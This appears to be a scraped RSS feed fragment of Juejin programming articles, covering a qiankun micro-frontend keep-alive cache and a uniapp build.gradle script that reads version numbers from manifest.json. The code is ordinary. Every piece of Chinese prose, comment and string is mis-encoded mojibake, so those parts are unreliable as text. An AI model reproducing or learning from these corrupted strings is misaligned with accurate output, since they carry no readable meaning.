        <span class="hljs-attr">container</span>: <span class="hljs-string">`#<span class="hljs-subst">${appContainerId}</span>`</span>,
        <span class="hljs-attr">props</span>: mergedProps,
      }, sandboxConfig)
      
      <span class="hljs-keyword">await</span> microApp.<span class="hljs-property">mountPromise</span>
      <span class="hljs-title function_">showAppContainer</span>(appContainerId)
      
      cachedMicroApps.<span class="hljs-title function_">set</span>(name, {
        <span class="hljs-attr">instance</span>: microApp,
        <span class="hljs-attr">containerId</span>: appContainerId,
        <span class="hljs-attr">lastActiveTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        entry,
      })
      
      currentAppName = name
      currentMicroApp = microApp
      
      <span class="hljs-title function_">loader</span>(<span class="hljs-literal">false</span>)
      <span class="hljs-keyword">return</span> microApp
    }
    
    <span class="hljs-comment">// ==================== éä¿æ´»æ¨¡å¼ ====================</span>
    <span class="hljs-comment">// ... ä¼ ç»Ÿå¸è½½åæŒ‚è½½é€»è¾‘</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`æŒ‚è½½å¾®åº”ç”¨ <span class="hljs-subst">${name}</span> å¤±è´¥:`</span>, error)
    <span class="hljs-title function_">loader</span>(<span class="hljs-literal">false</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
  }
}
</code></pre>
<h4 data-id="heading-55">3. é¡µç­¾ç®¡ç†</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/layout/TagsView/index.tsx</span>

<span class="hljs-comment">// ç›‘å¬è·¯ç”±å˜åŒ–ï¼Œè‡ªåŠ¨æ·»åŠ é¡µç­¾</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> hashPath = <span class="hljs-title function_">extractPath</span>(location.<span class="hljs-property">hash</span>)
  
  <span class="hljs-keyword">if</span> (mircoAppHash[hashPath]) {
    <span class="hljs-keyword">const</span> matchedItem = mircoAppHash[hashPath]
    <span class="hljs-keyword">const</span> index = tagsViewList.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">tag</span>) =&gt;</span> tag?.<span class="hljs-property">id</span> == matchedItem?.<span class="hljs-property">id</span>)
    
    <span class="hljs-keyword">if</span> (~index) {
      <span class="hljs-comment">// é¡µç­¾å·²å­˜åœ¨ï¼Œåªæ›´æ–°æ¿€æ´»çŠ¶æ€</span>
      <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">setActionTagsViewId</span>(matchedItem.<span class="hljs-property">id</span>))
      <span class="hljs-title function_">notifySubAppCache</span>(tagsViewList, <span class="hljs-string">`é¡µç­¾å·²å­˜åœ¨ <span class="hljs-subst">${hashPath}</span>`</span>)
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-comment">// æ–°å¢é¡µç­¾</span>
    <span class="hljs-keyword">const</span> _tagsViewList = <span class="hljs-title function_">cloneDeep</span>(tagsViewList) ?? []
    _tagsViewList.<span class="hljs-title function_">push</span>(matchedItem)
    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">setTagsViewList</span>(_tagsViewList))
    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">setActionTagsViewId</span>(matchedItem.<span class="hljs-property">id</span>))
    
    <span class="hljs-comment">// é€šçŸ¥å­åº”ç”¨ç¼“å­˜æ›´æ–°</span>
    <span class="hljs-title function_">notifySubAppCache</span>(_tagsViewList, <span class="hljs-string">`æ–°é¡µç­¾æ‰“å¼€ <span class="hljs-subst">${hashPath}</span>`</span>)
  }
}, [location.<span class="hljs-property">hash</span>])
</code></pre>
<hr/>
<h3 data-id="heading-56">ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-57">1. åˆå§‹åŒ–å¾®åº”ç”¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { initMicroApps } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/registerApp'</span>

<span class="hljs-comment">// åœ¨åº”ç”¨å¯åŠ¨æ—¶åˆå§‹åŒ–</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (mircoAppList &amp;&amp; mircoAppList.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-title function_">initMicroApps</span>(mircoAppList, permissionList)
  }
}, [mircoAppList])
</code></pre>
<h4 data-id="heading-58">2. æŒ‚è½½å¾®åº”ç”¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { mountMicroApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/registerApp'</span>

<span class="hljs-comment">// æ‰‹åŠ¨æŒ‚è½½</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">mountMicroApp</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'app-name'</span>,
  <span class="hljs-attr">entry</span>: <span class="hljs-string">'https://app.example.com'</span>,
  <span class="hljs-attr">container</span>: <span class="hljs-string">'#subApp'</span>,
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/wly-base/app-name/#/home'</span>,
  <span class="hljs-attr">defaultPath</span>: <span class="hljs-string">'/home'</span>,  <span class="hljs-comment">// å­åº”ç”¨é»˜è®¤è·¯å¾„</span>
})
</code></pre>
<h4 data-id="heading-59">3. æ§åˆ¶ä¿æ´»æ¨¡å¼</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { setKeepAliveEnabled, isKeepAliveEnabled } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/registerApp'</span>

<span class="hljs-comment">// å¯ç”¨/ç¦ç”¨ä¿æ´»</span>
<span class="hljs-title function_">setKeepAliveEnabled</span>(<span class="hljs-literal">true</span>)

<span class="hljs-comment">// æŸ¥è¯¢çŠ¶æ€</span>
<span class="hljs-keyword">const</span> enabled = <span class="hljs-title function_">isKeepAliveEnabled</span>()
</code></pre>
<h4 data-id="heading-60">4. æ¸…ç†ç¼“å­˜</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { clearAllCachedApps, removeCachedApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/registerApp'</span>

<span class="hljs-comment">// æ¸…ç©ºæ‰€æœ‰ç¼“å­˜</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">clearAllCachedApps</span>()

<span class="hljs-comment">// ç§»é™¤æŒ‡å®šåº”ç”¨</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">removeCachedApp</span>(<span class="hljs-string">'app-name'</span>)
</code></pre>
<h4 data-id="heading-61">5. å­åº”ç”¨æ¥å…¥</h4>
<p>å­åº”ç”¨éœ€è¦ï¼š</p>
<ol>
<li><strong>å¯¼å‡ºç”Ÿå‘½å‘¨æœŸé’©å­</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å­åº”ç”¨å…¥å£æ–‡ä»¶</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨å¯åŠ¨'</span>)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
  <span class="hljs-comment">// ç›‘å¬å…¨å±€çŠ¶æ€</span>
  props.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> { cachedTags } = state
    <span class="hljs-comment">// æ›´æ–° keep-alive ç¼“å­˜</span>
  }, <span class="hljs-literal">true</span>)
  
  <span class="hljs-comment">// æ¸²æŸ“åº”ç”¨</span>
  <span class="hljs-title function_">render</span>(props)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">unmount</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// æ¸…ç†</span>
}
</code></pre>
<ol start="2">
<li><strong>é…ç½® webpack publicPath</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// webpack.config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">publicPath</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span> 
      ? <span class="hljs-string">'https://app.example.com/'</span> 
      : <span class="hljs-string">'//localhost:3000/'</span>,
  },
}
</code></pre>
<hr/>
<h3 data-id="heading-62">æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-63">1. å®¹å™¨ç®¡ç†</h4>
<ul>
<li>âœ… æ¯ä¸ªå¾®åº”ç”¨ä½¿ç”¨ç‹¬ç«‹å®¹å™¨ï¼ˆ<code>subApp-{appName}</code>ï¼‰</li>
<li>âœ… å®¹å™¨ä½¿ç”¨ç»å¯¹å®šä½ï¼Œé¿å…å¸ƒå±€å†²çª</li>
<li>âœ… åˆ‡æ¢æ—¶é€šè¿‡ <code>display: none/block</code> æ§åˆ¶æ˜¾ç¤º</li>
</ul>
<h4 data-id="heading-64">2. å†…å­˜ç®¡ç†</h4>
<ul>
<li>âš ï¸ ç¼“å­˜æ•°é‡é™åˆ¶ä¸º 5 ä¸ªï¼ˆ<code>MAX_CACHED_APPS</code>ï¼‰</li>
<li>âš ï¸ è¶…è¿‡é™åˆ¶æ—¶è‡ªåŠ¨æ¸…ç†æœ€æ—§çš„åº”ç”¨</li>
<li>âš ï¸ é¡µé¢åˆ·æ–°ä¼šæ¸…ç©ºæ‰€æœ‰ç¼“å­˜</li>
</ul>
<h4 data-id="heading-65">3. è·¯ç”±åŒæ­¥</h4>
<ul>
<li>âœ… ä½¿ç”¨ <code>window.history.pushState</code> æ›´æ–° URL</li>
<li>âœ… æ‰‹åŠ¨è§¦å‘ <code>hashchange</code> å’Œ <code>popstate</code> äº‹ä»¶</li>
<li>âœ… å­åº”ç”¨éœ€è¦ç›‘å¬è·¯ç”±å˜åŒ–</li>
</ul>
<h4 data-id="heading-66">4. çŠ¶æ€åŒæ­¥</h4>
<ul>
<li>âœ… ä½¿ç”¨ qiankun <code>initGlobalState</code> åŒæ­¥é¡µç­¾çŠ¶æ€</li>
<li>âœ… å­åº”ç”¨éœ€è¦å®ç° <code>onGlobalStateChange</code> ç›‘å¬</li>
<li>âœ… é¡µç­¾å˜åŒ–æ—¶åŠæ—¶é€šçŸ¥å­åº”ç”¨</li>
</ul>
<h4 data-id="heading-67">5. æ ·å¼éš”ç¦»</h4>
<ul>
<li>âš ï¸ å½“å‰æœªå¯ç”¨ä¸¥æ ¼æ ·å¼éš”ç¦»</li>
<li>âš ï¸ å»ºè®®ä½¿ç”¨ CSS Modules æˆ– styled-components</li>
<li>âš ï¸ é¿å…å…¨å±€æ ·å¼æ±¡æŸ“</li>
</ul>
<h4 data-id="heading-68">6. æ€§èƒ½ä¼˜åŒ–</h4>
<ul>
<li>âœ… ä¿æ´»æ¨¡å¼å‡å°‘é‡å¤æŒ‚è½½å¼€é”€</li>
<li>âœ… LRU ç¼“å­˜ç­–ç•¥æ§åˆ¶å†…å­˜ä½¿ç”¨</li>
<li>âœ… å®¹å™¨æ˜¾ç¤º/éšè—æ¯”å¸è½½/æŒ‚è½½æ›´å¿«</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uniappåŠ¨æ€è¯»å–ç‰ˆæœ¬å·]]></title>    <link>https://juejin.cn/post/7580971667037454362</link>    <guid>https://juejin.cn/post/7580971667037454362</guid>    <pubDate>2025-12-08T06:03:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580971667037454362" data-draft-id="7580940585692659750" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uniappåŠ¨æ€è¯»å–ç‰ˆæœ¬å·"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-08T06:03:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¥ç¢—ç–™ç˜©æ±¤"/> <meta itemprop="url" content="https://juejin.cn/user/3250599254324776"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uniappåŠ¨æ€è¯»å–ç‰ˆæœ¬å·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3250599254324776/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¥ç¢—ç–™ç˜©æ±¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:03:16.000Z" title="Mon Dec 08 2025 06:03:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>appä¸‹build.gradleé…ç½®</p>
<pre><code class="hljs language-js" lang="js">apply <span class="hljs-attr">plugin</span>: <span class="hljs-string">'com.android.application'</span>


<span class="hljs-comment">// ä» manifest.json è¯»å–ç‰ˆæœ¬å·</span>
def <span class="hljs-title function_">getVersionInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ ¹æ®å®é™…è·¯å¾„è°ƒæ•´ï¼Œå¸¸è§è·¯å¾„ï¼š</span>
    <span class="hljs-comment">// 'src/main/assets/apps/__UNI__0BD8113/www/manifest.json'</span>
    def manifestFile = <span class="hljs-title function_">file</span>(<span class="hljs-string">'src/main/assets/apps/__UNI__0BD8113/www/manifest.json'</span>)

    <span class="hljs-comment">// è°ƒè¯•ä¿¡æ¯</span>
    println <span class="hljs-string">"======== ç‰ˆæœ¬å·è¯»å–è°ƒè¯• ========"</span>
    println <span class="hljs-string">"å½“å‰ç›®å½•: ${projectDir.absolutePath}"</span>
    println <span class="hljs-string">"manifest.json è·¯å¾„: ${manifestFile.absolutePath}"</span>
    println <span class="hljs-string">"æ–‡ä»¶æ˜¯å¦å­˜åœ¨: ${manifestFile.exists()}"</span>

    <span class="hljs-keyword">if</span> (!manifestFile.<span class="hljs-title function_">exists</span>()) {
        println <span class="hljs-string">"âŒ manifest.json æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä½¿ç”¨é»˜è®¤ç‰ˆæœ¬å·"</span>
        println <span class="hljs-string">"================================"</span>
        <span class="hljs-keyword">return</span> [<span class="hljs-attr">versionCode</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">versionName</span>: <span class="hljs-string">"1.0.0"</span>]
    }

    <span class="hljs-keyword">try</span> {
        def jsonSlurper = <span class="hljs-keyword">new</span> groovy.<span class="hljs-property">json</span>.<span class="hljs-title class_">JsonSlurper</span>()
        def manifest = jsonSlurper.<span class="hljs-title function_">parse</span>(manifestFile)

        <span class="hljs-comment">// ä» version å¯¹è±¡ä¸­è¯»å–</span>
        def versionCode = manifest.<span class="hljs-property">version</span>?.<span class="hljs-property">code</span>?.<span class="hljs-title function_">toInteger</span>() ?: <span class="hljs-number">1</span>
        def versionName = manifest.<span class="hljs-property">version</span>?.<span class="hljs-property">name</span> ?: <span class="hljs-string">"1.0.0"</span>

        println <span class="hljs-string">"âœ… è¯»å–åˆ°ç‰ˆæœ¬ä¿¡æ¯:"</span>
        println <span class="hljs-string">"   versionCode = ${versionCode}"</span>
        println <span class="hljs-string">"   versionName = ${versionName}"</span>
        println <span class="hljs-string">"================================"</span>

        <span class="hljs-keyword">return</span> [<span class="hljs-attr">versionCode</span>: versionCode, <span class="hljs-attr">versionName</span>: versionName]
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
        println <span class="hljs-string">"âŒ è§£æ manifest.json å¤±è´¥: ${e.message}"</span>
        println <span class="hljs-string">"================================"</span>
        <span class="hljs-keyword">return</span> [<span class="hljs-attr">versionCode</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">versionName</span>: <span class="hljs-string">"1.0.0"</span>]
    }
}

<span class="hljs-comment">// è·å–ç‰ˆæœ¬ä¿¡æ¯</span>
def versionInfo = <span class="hljs-title function_">getVersionInfo</span>()

android {
    compileSdkVersion <span class="hljs-number">36</span>
    buildToolsVersion <span class="hljs-string">'36.0.0'</span>

    <span class="hljs-comment">// åº”å’Œç¦»çº¿æ‰“åŒ…æ—¶ç”³è¯·ç¦»çº¿æ‰“åŒ…keyçš„å€¼ä¸€è‡´</span>
    namespace <span class="hljs-string">'com.android.chuanwu'</span>
    defaultConfig {
        <span class="hljs-comment">// åº”å’Œç¦»çº¿æ‰“åŒ…æ—¶ç”³è¯·ç¦»çº¿æ‰“åŒ…keyçš„å€¼ä¸€è‡´</span>
        applicationId <span class="hljs-string">"com.android.chuanwu"</span>
        <span class="hljs-comment">// æ’ä»¶aaræœ€ä½æ”¯æŒ26</span>
        minSdkVersion <span class="hljs-number">26</span>
        targetSdkVersion <span class="hljs-number">36</span> <span class="hljs-comment">//å»ºè®®æ­¤å±æ€§å€¼è®¾ä¸º21 io.dcloud.PandoraEntry ä½œä¸ºapkå…¥å£æ—¶   å¿…é¡»è®¾ç½® targetSDKVersion&gt;=21 æ²‰æµ¸å¼æ‰ç”Ÿæ•ˆ</span>

        <span class="hljs-comment">// åŠ¨æ€è®¾ç½®ç‰ˆæœ¬å·</span>
        versionCode versionInfo.<span class="hljs-property">versionCode</span>
        versionName versionInfo.<span class="hljs-property">versionName</span>

        multiDexEnabled <span class="hljs-literal">true</span>
        compileOptions {
            sourceCompatibility <span class="hljs-title class_">JavaVersion</span>.<span class="hljs-property">VERSION_1_8</span>
            targetCompatibility <span class="hljs-title class_">JavaVersion</span>.<span class="hljs-property">VERSION_1_8</span>
        }
    }

    signingConfigs {
        config {
            <span class="hljs-comment">// è¯ä¹¦åˆ«å</span>
            keyAlias <span class="hljs-string">''</span>
            <span class="hljs-comment">// è¯ä¹¦å¯†ç </span>
            keyPassword <span class="hljs-string">''</span>
            <span class="hljs-comment">// è¯ä¹¦æ–‡ä»¶è·¯å¾„</span>
            storeFile <span class="hljs-title function_">file</span>(<span class="hljs-string">'xxx.keystore'</span>)
            <span class="hljs-comment">// è¯ä¹¦å¯†ç </span>
            storePassword <span class="hljs-string">''</span>
            v1SigningEnabled <span class="hljs-literal">true</span>
            v2SigningEnabled <span class="hljs-literal">true</span>
        }
    }

    buildTypes {
        release {
            signingConfig signingConfigs.<span class="hljs-property">config</span>
            zipAlignEnabled <span class="hljs-literal">false</span>
            minifyEnabled <span class="hljs-literal">false</span>
            proguardFiles <span class="hljs-title function_">getDefaultProguardFile</span>(<span class="hljs-string">'proguard-android.txt'</span>), <span class="hljs-string">'proguard-rules.pro'</span>
        }
        debug {
            signingConfig signingConfigs.<span class="hljs-property">config</span>
            zipAlignEnabled <span class="hljs-literal">false</span>
            minifyEnabled <span class="hljs-literal">false</span>
            proguardFiles <span class="hljs-title function_">getDefaultProguardFile</span>(<span class="hljs-string">'proguard-android.txt'</span>), <span class="hljs-string">'proguard-rules.pro'</span>
        }
    }


    applicationVariants.<span class="hljs-property">all</span> { variant -&gt;
        variant.<span class="hljs-property">outputs</span>.<span class="hljs-property">all</span> { output -&gt;
            <span class="hljs-comment">// è‡ªå®šä¹‰ APK åç§°</span>
            outputFileName = <span class="hljs-string">"app-${versionInfo.versionName}.apk"</span>
        }
    }


    <span class="hljs-comment">//ä½¿ç”¨uniappæ—¶ï¼Œéœ€å¤åˆ¶ä¸‹é¢ä»£ç </span>
    <span class="hljs-comment">/*ä»£ç å¼€å§‹*/</span>
    aaptOptions {
        additionalParameters <span class="hljs-string">'--auto-add-overlay'</span>
        <span class="hljs-comment">//noCompress 'foo', 'bar'</span>
        ignoreAssetsPattern <span class="hljs-string">"!.svn:!.git:.*:!CVS:!thumbs.db:!picasa.ini:!*.scc:*~"</span>
    }
    compileOptions {
        sourceCompatibility <span class="hljs-title class_">JavaVersion</span>.<span class="hljs-property">VERSION_1_8</span>
        targetCompatibility <span class="hljs-title class_">JavaVersion</span>.<span class="hljs-property">VERSION_1_8</span>
    }
    <span class="hljs-comment">/*ä»£ç ç»“æŸ*/</span>
}
repositories {
    flatDir {
        dirs <span class="hljs-string">'libs'</span>
    }
}
dependencies {
    implementation <span class="hljs-title function_">fileTree</span>(<span class="hljs-attr">dir</span>: <span class="hljs-string">'libs'</span>, <span class="hljs-attr">include</span>: [<span class="hljs-string">'*.jar'</span>])
    implementation <span class="hljs-title function_">fileTree</span>(<span class="hljs-attr">dir</span>: <span class="hljs-string">'libs'</span>, <span class="hljs-attr">include</span>: [<span class="hljs-string">'*.aar'</span>])

    <span class="hljs-comment">/*uniappæ‰€éœ€åº“-----------------------å¼€å§‹*/</span>
    implementation <span class="hljs-string">'androidx.recyclerview:recyclerview:1.1.0'</span>
    implementation <span class="hljs-string">'com.facebook.fresco:fresco:1.13.0'</span>
    implementation <span class="hljs-string">"com.facebook.fresco:animated-gif:1.13.0"</span>
    <span class="hljs-comment">/*uniappæ‰€éœ€åº“-----------------------ç»“æŸ*/</span>
    <span class="hljs-comment">// åŸºåº§éœ€è¦ï¼Œå¿…é¡»æ·»åŠ </span>
    implementation <span class="hljs-string">'com.github.bumptech.glide:glide:4.9.0'</span>
    implementation <span class="hljs-string">'com.alibaba:fastjson:1.2.83'</span>
    implementation <span class="hljs-string">'androidx.webkit:webkit:1.5.0'</span>
    implementation <span class="hljs-string">'androidx.localbroadcastmanager:localbroadcastmanager:1.0.0'</span>
    implementation <span class="hljs-string">'androidx.core:core:1.1.0'</span>
    implementation <span class="hljs-string">"androidx.fragment:fragment:1.1.0"</span>
    implementation <span class="hljs-string">'androidx.appcompat:appcompat:1.1.0'</span>
    <span class="hljs-comment">// æ·»åŠ uni-appæ’ä»¶</span>
    implementation <span class="hljs-title function_">project</span>(<span class="hljs-string">':uniplugin_scancode'</span>)
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨å¤§å‹é¡¹ç›®ä¸­ä¸ºä»€ä¹ˆæ›´æ¨èComposition APIï¼Ÿå®ƒè§£å†³äº†å“ªäº›å·¥ç¨‹åŒ–é—®é¢˜ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7580616979473924102</link>    <guid>https://juejin.cn/post/7580616979473924102</guid>    <pubDate>2025-12-08T06:06:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580616979473924102" data-draft-id="7580753790771937322" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨å¤§å‹é¡¹ç›®ä¸­ä¸ºä»€ä¹ˆæ›´æ¨èComposition APIï¼Ÿå®ƒè§£å†³äº†å“ªäº›å·¥ç¨‹åŒ–é—®é¢˜ï¼Ÿ"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-08T06:06:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta 